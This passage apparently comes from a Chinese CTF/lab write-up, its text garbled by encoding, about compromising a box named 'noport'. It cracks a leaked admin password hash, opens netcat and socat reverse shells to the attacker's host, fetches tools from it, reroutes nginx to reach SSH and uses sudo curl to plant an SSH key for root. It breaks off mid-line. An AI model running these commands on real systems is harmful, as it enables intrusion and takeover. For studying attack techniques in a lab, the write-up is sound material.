<p>è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆå…³é”®çš„ç‚¹ï¼Œè¿™é‡Œçš„é¢ç”¨æˆ·è®¤è¯è¢«æ³¨é‡Šäº†ï¼Œæ‰€ä»¥åªæœ‰è¿™ä¸ªè·¯ç”±æ˜¯ä¸éœ€è¦è®¤è¯ä¹Ÿå¯ä»¥æ­£å¸¸è®¿é—®çš„ï¼Œç„¶åå¦‚æœç”¨postå‘é€è¯·æ±‚ï¼Œæœ‰uriå‚æ•°ï¼Œä¼šå‘é€åˆ°test.php ä½œä¸ºgetè¯·æ±‚çš„å‚æ•° ã€‚  è¿™é‡Œä¹Ÿå¯ä»¥çŒœæµ‹å‡ºï¼Œå¦‚æœç›´æ¥ä½¿ç”¨test.phpè®¿é—®å¯èƒ½æœ‰äº›æœ¬åœ°ipè®¤è¯ ï¼ˆä¸è¿‡å…¶å®å¹¶æ²¡æœ‰ï¼‰<br>ç„¶åæˆ‘ä»¬å¯ä»¥test.phpè¯·æ±‚åçš„å†…å®¹å¯ä»¥åœ¨æ‰«åˆ°çš„logä¸­çœ‹åˆ°<br>æ¯”å¦‚æˆ‘ç°åœ¨è®¿é—®test.php?uri&#x3D;test.php è¿”å›<br>[2025-04-24 20:00:39] Bot visited test.php, response:<br>å‘ç°è¿™é‡Œçš„è¿”å›ä¿¡æ¯æ˜¯ä¸å®Œæ•´çš„ã€‚<br>è¿™é‡Œå°±å¡ä½äº†æˆ‘å¾ˆä¹…  æˆ‘è¢«loginè·¯ç”±è¿·æƒ‘äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="variable">$path</span> === <span class="string">&#x27;login&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="variable">$db</span> = <span class="title function_ invoke__">get_db_connection</span>();</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE username = :username AND password = :password&#x27;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:username&#x27;</span>, <span class="variable">$username</span>, SQLITE3_TEXT);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:password&#x27;</span>, <span class="variable">$password</span>, SQLITE3_TEXT);</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetchArray</span>(SQLITE3_ASSOC);</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">	    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Logged in successfully&quot;</span>]);</span><br><span class="line">	    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: sh3ll.php&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 401 Unauthorized&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Invalid credentials&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæ˜¾ç¤ºç™»å½•ä¹‹åä¼šè·³è½¬åˆ°sh3ll.php ç„¶åæˆ‘ç»§ç»­ç”¨test.phpè¯»ä¸€ä¸‹sh3ll.php è¿”å›</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line">[2025-04-24 20:02:06] Bot visited sh3ll.php, response: </span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>éµÑ†î”‘é›æˆ’æŠ¤<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    é›æˆ’æŠ¤: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;command&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    &lt;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå‡ºç°ä¸€ä¸ªpostè¯·æ±‚ï¼Œç„¶åcommandï¼Œåº”è¯¥æ˜¯æ‰§è¡Œå‘½ä»¤ï¼Œæˆ‘ä¸€ç›´æƒ³èƒ½ä¸èƒ½ç»•è¿‡ç™»å½•çš„é™åˆ¶ï¼Œç›´æ¥æ‰§è¡Œsh3ll.phpç„¶åå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯ä¸€ç›´ä¸è¡Œã€‚<br>ç„¶åindex.phpè¿˜æœ‰ä¸€éƒ¨åˆ†å†…å®¹å¾ˆé‡è¦</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">verify_user</span>();</span><br><span class="line">    <span class="variable">$db</span> = <span class="title function_ invoke__">get_db_connection</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^profile/&#x27;</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT id, username, email, password, api_key, created_at FROM users WHERE username = :username&#x27;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:username&#x27;</span>, <span class="variable">$username</span>, SQLITE3_TEXT);</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$user</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetchArray</span>(SQLITE3_ASSOC);</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæ˜¾ç¤ºè¦æ˜¯è¿”å›profileå°±ä¼šåœ¨æ•°æ®åº“é‡Œé¢æŸ¥è¯¢ï¼Œå…¶å®è¿™é‡Œå°±æ˜¯webçš„å…³é”®äº†ï¼Œè¿™é‡Œå°±å¯ä»¥è·å¾—å…³é”®çš„ä¿¡æ¯ï¼Œä½†æ˜¯æˆ‘å› ä¸ºä»¥ä¸ºåœ¨test.phpè®¿é—®ä¹‹åå¾—åˆ°çš„å†…å®¹ä¸å®Œæ•´ã€‚ ç„¶åå°±æ²¡æœ‰ç›´æ¥ç”¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line">[2025-04-24 19:59:03] Bot visited profile, response: &#123;&quot;id&quot;:1,&quot;username&quot;:&quot;admin&quot;,&quot;email&quot;:&quot;admin@example.com&quot;,&quot;password&quot;:&quot;6f06ee724b86fca512018ad692a62aedc</span><br></pre></td></tr></table></figure></div>
<p>è¿™æ˜¯ä¸€ä¸ªsha256åŠ å¯†ä¹‹åçš„hash<br>å…¶å®å°±æ˜¯è¦çˆ†ç ´,æŠŠå­—å…¸é‡Œé¢çš„å¯†ç sha256åŠ å¯†ï¼Œç„¶åæ¯”è¾ƒå‰é¢çš„hashï¼Œå¦‚æœä¸€æ ·è¯´æ˜ï¼Œå°±æ˜¯æ­£ç¡®çš„å¯†ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># cat tmp.py                      </span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡å“ˆå¸Œå‰ç¼€</span></span><br><span class="line">target_prefix = <span class="string">&#x27;6f06ee724b86fca512018ad692a62aedc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å­—å…¸æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">dictionary_file = <span class="string">&#x27;rockyou.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(dictionary_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">            <span class="comment"># å»é™¤è¡Œå°¾çš„æ¢è¡Œç¬¦</span></span><br><span class="line">            word = line.strip()</span><br><span class="line">            <span class="comment"># è®¡ç®— SHA-256 å“ˆå¸Œå€¼</span></span><br><span class="line">            hash_value = hashlib.sha256(word.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">            <span class="comment"># æ£€æŸ¥å“ˆå¸Œå€¼æ˜¯å¦ä»¥ç›®æ ‡å‰ç¼€å¼€å¤´</span></span><br><span class="line">            <span class="keyword">if</span> hash_value.startswith(target_prefix):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;åŒ¹é…æˆåŠŸï¼åŸå§‹å­—ç¬¦ä¸²ä¸º: <span class="subst">&#123;word&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;æœªæ‰¾åˆ°åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;å­—å…¸æ–‡ä»¶ &quot;<span class="subst">&#123;dictionary_file&#125;</span>&quot; æœªæ‰¾åˆ°ã€‚è¯·ç¡®ä¿æ–‡ä»¶è·¯å¾„æ­£ç¡®ã€‚&#x27;</span>)</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># python3 tmp.py           </span></span><br><span class="line">åŒ¹é…æˆåŠŸï¼åŸå§‹å­—ç¬¦ä¸²ä¸º: shredder1</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°å¯†ç <code>shredder1</code><br><img src="https://pic1.imgdb.cn/item/680a2b7458cb8da5c8c90618.png"><br>ç™»å½•ä¹‹åå°±è·³è½¬åˆ°sh3ll.phpç„¶åå¯ä»¥æ‰§è¡Œå‘½ä»¤ æ‰€ä»¥ä¸‹ä¸€æ­¥å°±æ˜¯åå¼¹shell<br><code>nc 192.168.34.11 1234 -e /bin/bash</code></p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><h2 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h2><h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">cd ../</span><br><span class="line">ls -al</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x   <span class="number"> 3 </span>root     root         <span class="number"> 4096 </span>Apr<span class="number"> 20 </span>21:43 .</span><br><span class="line">drwxr-xr-x  <span class="number"> 14 </span>root     root         <span class="number"> 4096 </span>Apr<span class="number"> 20 </span>18:22 ..</span><br><span class="line">drwxr-xr-x   <span class="number"> 4 </span>root     root         <span class="number"> 4096 </span>Apr<span class="number"> 20 </span>13:45 localhost</span><br><span class="line">lrwxrwxrwx   <span class="number"> 1 </span>root     root           <span class="number"> 16 </span>Apr<span class="number"> 20 </span>13:45 logs -&gt; /var/log/apache2</span><br><span class="line">lrwxrwxrwx   <span class="number"> 1 </span>root     root           <span class="number"> 16 </span>Apr<span class="number"> 20 </span>13:45 modules -&gt; /usr/lib/apache2</span><br><span class="line">-rw-r--r--   <span class="number"> 1 </span>root     root          <span class="number"> 129 </span>Apr<span class="number"> 20 </span>21:44 pass</span><br><span class="line">lrwxrwxrwx   <span class="number"> 1 </span>root     root           <span class="number"> 12 </span>Apr<span class="number"> 20 </span>13:45 run -&gt; /run/apache2</span><br><span class="line">cat pass</span><br><span class="line">To prevent myself fron forgetting my password,i set my password to be the same as the website password so that i wont forget it!</span><br></pre></td></tr></table></figure></div>
<p>æ‰¾åˆ°ä¸€ä¸ªpassæ–‡ä»¶ï¼Œè¯´æ˜å¯†ç å’Œwebå¯†ç ä¸€æ ·ï¼Œç„¶åå»&#x2F;homeç›®å½•ä¸‹æ‰¾åˆ°ç”¨æˆ·å<code>akaRed</code><br>ä½†æ˜¯ç°åœ¨çš„é—®é¢˜æ˜¯é¶æœºåªæœ‰80ç«¯å£å¼€æ”¾ ç”¨netstatçœ‹çœ‹ç°åœ¨çš„ç«¯å£å¼€æ”¾æƒ…å†µ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">netstat</span> -lntup</span><br><span class="line"><span class="attribute">Active</span> Internet connections (only servers)</span><br><span class="line"><span class="attribute">Proto</span> Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line"><span class="attribute">tcp</span>        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0.0.0:80</span>              <span class="number">0.0.0.0</span>:*               LISTEN      -</span><br><span class="line"><span class="attribute">tcp</span>        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0.0.1:8080</span>          <span class="number">0.0.0.0</span>:*               LISTEN      -</span><br><span class="line"><span class="attribute">tcp</span>        <span class="number">0</span>      <span class="number">0</span> <span class="number">127.0.0.1:22</span>            <span class="number">0.0.0.0</span>:*               LISTEN      -</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°æ˜¯æœ‰22ç«¯å£åœ¨ç›‘å¬çš„ï¼Œæ‰€ä»¥ç”¨socatè½¬å‘ä¸€ä¸‹ç«¯å£<br>æœ¬åœ°å¼€python httpæœåŠ¡  é¶æœºåœ¨tmpç›®å½•ä¸‹é¢ä¸‹è½½ ç„¶åç»™æ‰§è¡Œæƒé™</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COFFEESCRIPT"><figure class="iseeu highlight /coffeescript"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># python3 -m http.server 8080</span></span><br><span class="line">Serving HTTP <span class="literal">on</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">8080</span> (http:<span class="regexp">//0.0.0.0:8080/</span>) ...</span><br><span class="line"></span><br><span class="line">busybox wget <span class="number">192.168</span><span class="number">.34</span><span class="number">.11</span>:<span class="number">8080</span>/socat </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œsocatä¸èƒ½åƒä¹‹å‰é‚£æ ·ç®€å•è½¬å‘22ç«¯å£</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ”»å‡»æœº</span></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:8888</span><br><span class="line"></span><br><span class="line"><span class="comment"># é¶æœº</span></span><br><span class="line">./socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.34.11:8888</span><br></pre></td></tr></table></figure></div>
<p>è¿™æ ·çš„æ„æ€å°±æ˜¯æ”»å‡»æœºä¸Šé¢çš„ç»ˆç«¯ttyä½œä¸ºI&#x2F;Oç›®æ ‡ è®¾ç½®ç»ˆç«¯ä¸ºåŸå§‹æ¨¡å¼ï¼Œå¹¶å…³é—­å›æ˜¾<br>ä¸Šæ¥ä¹‹ååˆ‡æ¢ç”¨æˆ· å°±ç”¨webçš„å¯†ç </p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">noport:/tmp$ ssh akaRed@127.0.0.1</span><br><span class="line">Could not <span class="keyword">create</span> directory <span class="string">&#x27;/var/www/.ssh&#x27;</span>.</span><br><span class="line">The authenticity of host <span class="string">&#x27;127.0.0.1 (127.0.0.1)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:66Wi/BsnYTXMZk8Pqh7zv03E330mhNj8W21ltvR/uqs.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).</span></span><br><span class="line"><span class="string">akaRed@127.0.0.1&#x27;</span>s <span class="keyword">password</span>: </span><br><span class="line">Welcome <span class="keyword">to</span> Alpine!</span><br><span class="line"></span><br><span class="line">The Alpine Wiki <span class="built_in">contains</span> a large amount of how-<span class="keyword">to</span> guides <span class="keyword">and</span> general</span><br><span class="line">information about administrating Alpine systems.</span><br><span class="line">See &lt;http://wiki.alpinelinux.org/&gt;.</span><br><span class="line"></span><br><span class="line">You can setup the <span class="keyword">system</span> <span class="keyword">with</span> the command: setup-alpine</span><br><span class="line"></span><br><span class="line">You may change this message <span class="keyword">by</span> editing /etc/motd.</span><br><span class="line"></span><br><span class="line">noport:~$ id</span><br><span class="line">uid=<span class="number">1000</span>(akaRed) gid=<span class="number">1000</span>(akaRed) groups=<span class="number">1000</span>(akaRed)</span><br></pre></td></tr></table></figure>
<h3 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h3><p>å°±æ˜¯ä¸ç”¨socatç«¯å£è½¬å‘ï¼Œå®ç°sshçš„æ–¹æ³•<br>è¿™é‡Œæ˜¯nginxçš„é…ç½®å¯ä»¥ä¿®æ”¹ ä»¥åŠæœ‰reboot çš„sudoæƒé™</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">noport:/etc/nginx$ ls -al</span><br><span class="line">total 44</span><br><span class="line">drwxr-xr-x   <span class="number"> 4 </span>root     root         <span class="number"> 4096 </span>Apr<span class="number"> 20 </span>18:27 .</span><br><span class="line">drwxr-xr-x  <span class="number"> 31 </span>root     root         <span class="number"> 4096 </span>Apr<span class="number"> 24 </span>21:30 ..</span><br><span class="line">drwxr-xr-x   <span class="number"> 2 </span>root     root         <span class="number"> 4096 </span>Apr<span class="number"> 20 </span>18:27 conf.d</span><br><span class="line">-rw-r--r--   <span class="number"> 1 </span>root     root         <span class="number"> 1077 </span>Jun<span class="number"> 14 </span><span class="number"> 2021 </span>fastcgi.conf</span><br><span class="line">-rw-r--r--   <span class="number"> 1 </span>root     root         <span class="number"> 1007 </span>Jun<span class="number"> 14 </span><span class="number"> 2021 </span>fastcgi_params</span><br><span class="line">-rw-r--r--   <span class="number"> 1 </span>root     root         <span class="number"> 5231 </span>Jun<span class="number"> 14 </span><span class="number"> 2021 </span>mime.types</span><br><span class="line">drwxr-xr-x   <span class="number"> 2 </span>root     root         <span class="number"> 4096 </span>Apr<span class="number"> 20 </span>18:26 modules</span><br><span class="line">-rwxrwxrwx   <span class="number"> 1 </span>root     root         <span class="number"> 2489 </span>Apr<span class="number"> 21 </span>15:36 nginx.conf</span><br><span class="line">-rw-r--r--   <span class="number"> 1 </span>root     root          <span class="number"> 636 </span>Jun<span class="number"> 14 </span><span class="number"> 2021 </span>scgi_params</span><br><span class="line">-rw-r--r--   <span class="number"> 1 </span>root     root          <span class="number"> 664 </span>Jun<span class="number"> 14 </span><span class="number"> 2021 </span>uwsgi_params</span><br><span class="line"></span><br><span class="line">noport:/etc/nginx$ sudo -l</span><br><span class="line">User apache may run the following commands on noport:</span><br><span class="line">    (root) NOPASSWD: /sbin/reboot</span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥ç°åœ¨å¯ä»¥ä¿®æ”¹nginxçš„é…ç½®ï¼ŒæŠŠ80ç«¯å£æ”¹æˆ22ç«¯å£çš„æµé‡<br>æ‰€ä»¥åœ¨nginx.conf ä¸­æ³¨é‡Šæ‰ ç„¶åæ·»åŠ streamæ¨¡å—</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">stream</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span> <span class="number">127.0.0.1:22</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>é‡å¯ä¹‹åå¯ä»¥ä½¿ç”¨sshç™»å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TP"><figure class="iseeu highlight /tp"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ssh akaRed@<span class="number">192</span><span class="number">.168</span><span class="number">.34</span><span class="number">.83</span> -p <span class="number">80</span> </span><br><span class="line">The authenticity of host <span class="string">&#x27;[192.168.34.83]:80 ([192.168.34.83]:80)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:svcl4A5xaXn8rkG4hfYviJopD6R/IDTyDXqvnIEwbkE.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[<span class="number">192</span><span class="number">.168</span><span class="number">.34</span><span class="number">.83</span>]:<span class="number">80</span><span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">akaRed@192.168.34.83&#x27;</span>s password: </span><br><span class="line">Welcome to Alpine<span class="comment">!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The Alpine Wiki contains a large amount of how-to guides and general</span></span><br><span class="line"><span class="comment">information about administrating Alpine systems.</span></span><br><span class="line"><span class="comment">See &lt;http://wiki.alpinelinux.org/&gt;.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">You can setup the system with the command: setup-alpine</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">You may change this message by editing /etc/motd.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">noport:~$</span> </span><br></pre></td></tr></table></figure></div>
<h2 id="akaRed"><a href="#akaRed" class="headerlink" title="akaRed"></a>akaRed</h2><p>æœ‰curlçš„sudoæƒé™</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">noport:~$ sudo <span class="operator">-</span>l</span><br><span class="line">User akaRed may run the following commands on <span class="params">noport:</span></span><br><span class="line">    (root) <span class="params">NOPASSWD:</span> <span class="symbol">/usr/bin/curl</span></span><br><span class="line">    (root) <span class="params">NOPASSWD:</span> <span class="operator">/</span>sbin<span class="operator">/</span>reboot</span><br></pre></td></tr></table></figure></div>
<p>åœ¨æœ¬åœ°çœ‹ä¸€ä¸‹curlæœ‰å“ªäº›å‚æ•°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl -h                                                                                             </span><br><span class="line">Usage: curl [<span class="keyword">options</span>...] <span class="symbol">&lt;url&gt;</span></span><br><span class="line"> -d, --data <span class="symbol">&lt;data&gt;</span>           HTTP POST data</span><br><span class="line"> -<span class="keyword">f</span>, --fail                  Fail fast with <span class="keyword">no</span> output <span class="keyword">on</span> HTTP errors</span><br><span class="line"> -h, --<span class="keyword">help</span> <span class="symbol">&lt;subject&gt;</span>        Get <span class="keyword">help</span> <span class="keyword">for</span> commands</span><br><span class="line"> -<span class="keyword">o</span>, --output <span class="symbol">&lt;file&gt;</span>         Write <span class="keyword">to</span> <span class="keyword">file</span> instead of stdout</span><br><span class="line"> -O, --remote-name           Write output <span class="keyword">to</span> <span class="keyword">file</span> named <span class="keyword">as</span> remote <span class="keyword">file</span></span><br><span class="line"> -i, --show-headers          Show response headers in output</span><br><span class="line"> -s, --<span class="keyword">silent</span>                Silent <span class="keyword">mode</span></span><br><span class="line"> -T, --upload-<span class="keyword">file</span> <span class="symbol">&lt;file&gt;</span>    Transfer local FILE <span class="keyword">to</span> destination</span><br><span class="line"> -<span class="keyword">u</span>, --user &lt;user:password&gt;  Server user <span class="built_in">and</span> password</span><br><span class="line"> -A, --user-agent <span class="symbol">&lt;name&gt;</span>     Send User-Agent <span class="symbol">&lt;name&gt;</span> <span class="keyword">to</span> server</span><br><span class="line"> -v, --<span class="keyword">verbose</span>               Make the operation more talkative</span><br><span class="line"> -V, --<span class="keyword">version</span>               Show <span class="keyword">version</span> <span class="keyword">number</span> <span class="built_in">and</span> <span class="keyword">quit</span></span><br></pre></td></tr></table></figure></div>
<p>å‘ç°æœ‰-oå‚æ•° å¯ä»¥å†™å…¥æ–‡ä»¶ï¼Œé‚£å°±å¥½åŠäº†  åœ¨å­˜æ”¾æœ¬åœ°å…¬é’¥çš„åœ°æ–¹å¼€httpæœåŠ¡ï¼Œç„¶åç”¨-oæŠŠè¿™ä¸ªæ–‡ä»¶å†™å…¥åˆ°rootçš„authorized_keysä¸­</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/.ssh]</span><br><span class="line">â””â”€<span class="comment"># ls                         </span></span><br><span class="line">authorized_keys  id_ed25519  id_ed25519.pub  id_rsa  id_rsa.pub  known_hosts  known_hosts.old</span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/.ssh]</span><br><span class="line">â””â”€<span class="comment"># python3 -m http.server 8080</span></span><br><span class="line"><span class="title class_">Serving</span> <span class="title class_">HTTP</span> on <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">8080</span> (<span class="symbol">http:</span>//<span class="number">0.0</span>.<span class="number">0.0</span><span class="symbol">:</span><span class="number">8080</span>/) ...</span><br><span class="line"><span class="number">192.168</span>.<span class="number">34.83</span> - - [<span class="number">24</span>/<span class="title class_">Apr</span>/<span class="number">2025</span> <span class="number">22</span><span class="symbol">:</span><span class="number">19</span><span class="symbol">:</span><span class="number">13</span>] <span class="string">&quot;GET /authorized_keys HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line">^C</span><br><span class="line"><span class="title class_">Keyboard</span> interrupt received, exiting.</span><br><span 